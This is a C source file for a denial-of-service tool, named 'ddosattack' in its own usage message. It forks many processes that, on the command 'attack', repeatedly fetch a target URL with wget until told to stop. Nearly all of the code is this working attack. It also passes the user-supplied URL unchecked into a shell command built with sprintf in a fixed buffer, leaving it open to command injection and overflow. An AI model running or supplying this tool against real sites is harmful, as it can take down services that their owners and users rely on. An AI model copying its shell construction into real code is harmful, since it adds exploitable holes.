#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>

int s = 0;
char* url;

void worker(int sig){
	char u[200];
	sprintf(u, "wget -q -O - -o /dev/null %s >/dev/null", url); 
	while(true){
		double x = drand48();
		s = x * s;
		usleep(1000*s);
		system(u);
		fprintf(stderr, "%d: sending request\n", getpid());
	}
}

void stop(int sig){
	_exit(3);
}

void waitfunc(int procs, pid_t* rv){
	for(int i = 0; i < procs; i++){
		wait(NULL);
	}
}
		

int main(int argc, char **argv){
	if(argc != 4){
		printf("./ddosattack N-procs MaxSleepTime \"url\"\n");
		exit(1);
	}
		
	printf("Enter \"attack\" to begin DOS attack on\n%s\n", argv[3]);
	printf("Enter \"stop\" to stop DOS attack and exit\n");

	s = atoi(argv[2]);

	if(s < 0){
		printf("Enter in a valid MaxSleepTime");
		exit(1);
	}

	url = argv[3];
	int procs = atoi(argv[1]);
	if(procs <= 0) {
		printf("Enter a valid number of processes\n");
		exit(1);
	}
	
	pid_t *rv = (pid_t*) malloc(sizeof(pid_t) * procs);
		
	for(int i = 0; i < procs; i++){
		pid_t retval = fork();
		if(retval == 0){
			signal(SIGUSR1, worker);
			signal(SIGUSR2, stop);
			while(true){pause();}
		} else if(retval > 0){	
			rv[i] = retval;
			setpgid(retval,rv[0]);
		}
	}

	char attack[8];
	while(scanf("%7s", attack)){
		if(strcmp(attack, "attack") == 0){
			break;
		} else{printf("INVALID REQUEST\n");}
	}
	kill(-rv[0], SIGUSR1);

	char stp[5];
	while(scanf("%4s", stp)){
		if(strcmp(stp, "stop") == 0){
			break;
		} else{printf("INVALID REQUEST\n");}
	}
	kill(-rv[0], SIGUSR2);
	waitfunc(procs, rv);
}

